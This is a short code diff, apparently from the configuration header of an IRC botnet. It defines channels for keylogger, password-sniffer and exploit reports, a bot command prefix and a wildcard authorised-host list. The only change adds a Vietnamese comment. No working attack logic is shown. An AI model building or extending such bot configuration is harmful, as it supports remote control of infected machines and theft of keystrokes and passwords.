@@ -40,7 +40,7 @@ char modeonconn[] = "-x+B";					// Can be more than one mode and contain both + 
 char exploitchan[] = "#n";					// Channel where exploit messages get redirected
 char keylogchan[] =  "#n"; 					// Channel where keylog messages get redirected
 char psniffchan[] = "#n";						// Channel where psniff messages get redirected 
-char *command_prefix = "abcd PRIVMSG #oper :."; 
+char *command_prefix = "abcd PRIVMSG #oper :.";  	// khai báo cái nùi đó ở đây
 
 char *authost[] = {
 	"*@*",
